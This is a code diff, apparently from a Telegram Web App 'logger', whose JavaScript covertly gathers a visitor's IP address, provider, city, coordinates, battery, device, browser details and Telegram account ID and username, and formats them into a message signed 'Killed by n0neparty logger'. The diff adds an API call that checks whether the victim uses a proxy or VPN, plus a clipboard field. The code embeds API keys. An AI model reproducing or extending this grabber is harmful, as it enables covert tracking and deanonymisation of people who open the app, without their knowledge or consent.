@@ -120,39 +120,59 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let namebrowser = engine.name;
   let osnam = data.os.name;
   let osvers = data.os.version;
-    
+
+fetch('https://api.ipdata.co/' + ip + '/threat?api-key=d2bc3795e24c5db7c7117376a5c35a1641c6132fa6f484ad0797469b')
+.then(response => response.json())
+.then(data => {
+    let isProxy = data.is_proxy;
+    let isVPN = data.is_vpn;
+    let isAnonymous = data.is_anonymous;
+
         const message = `
-      * Ip 🌐*
-    *├ IP: ${ip}*
-    *├ UserAgent: ${userAgent}*
-    *├ Provider: ${isp}*
-    *├ City: ${city}*
-    *├ Region: ${region}*
-    *├ Timezone IP: ${time}*
-    *├ Coordinates: ${longitude} ${latitude},*
-    *├ TLD: ${tld}*
-    *├ Version: ${versian}*
-      * System 🖥*
-    *├ Browser: ${browser}*
-    *├ Browser Engine: ${namebrowser}*
-    *├ Os: ${osname}*
-    *├ Battery: ${batteryLevel}%*
-    *├ Screen resolution: ${screenWidth}x${screenHeight}*
-    *├ Time: ${formattedTime}*
-    *├ Language: ${language}*
-    *├ Date: ${formedDate} Day of week: ${dayOfWeek}*
-    *├ Memory: ${memory} RAM*
-    *├ Internet: ${TypeInternet}*
-    *├ TimeZone: ${timeZone}*
-    *├ Device: ${model}*
-    *├ Device Type: ${deviceType}*
-      *🔍 Account: *
-    *├ ID: ${tg.initDataUnsafe.user.id}*
-    *├ Username: @${tg.initDataUnsafe.user.username}*
-    *├ Name: ${tg.initDataUnsafe.user.first_name}*
-    *├ Language: ${tg.initDataUnsafe.user.language_code}*
-    *├ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
-    *Killed by n0neparty logger 👾*
+*🔎 ip*
+*├ IP: ${ip}*
+*├ Provider: ${isp}*
+*├ City: ${city}*
+*├ Region: ${region}*
+*└ Timezone IP: ${time}*
+
+*📶 Net Info*
+*├ Proxy: ${isProxy}*
+*├ Vpn: ${isVPN}*
+*├ Anonymous: ${isAnonymous}*
+*├ Coordinates: ${longitude} ${latitude},*
+*├ TLD: ${tld}*
+*├ Version: ${versian}*
+*└ Internet: ${TypeInternet}*
+
+    
+ *💻 System*
+*├ Os: ${osname}*
+*├ Battery: ${batteryLevel}%*
+*├ Screen resolution: ${screenWidth}x${screenHeight}*
+*├ Time: ${formattedTime}*
+*├ Language: ${language}*
+*├ Date: ${formedDate} Day of week: ${dayOfWeek}*
+*├ Memory: ${memory} RAM*
+*├ TimeZone: ${timeZone}*
+*├ Device: ${model}*
+*└ Device Type: ${deviceType}*
+
+*🌐 Browser*
+*├ Browser: ${browser}*
+*├ Browser Engine: ${namebrowser}*
+*└ UserAgent: ${userAgent}*
+
+ *📄 Clipboard*
+ *└ Undefined*
+    
+*👤 Account: *
+*├ ID: ${tg.initDataUnsafe.user.id}*
+*├ Username: @${tg.initDataUnsafe.user.username}*
+*├ Name: ${tg.initDataUnsafe.user.first_name}*
+*├ Language: ${tg.initDataUnsafe.user.language_code}*
+*└ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
+             *Killed by n0neparty logger 👾*
                              `;
 
         
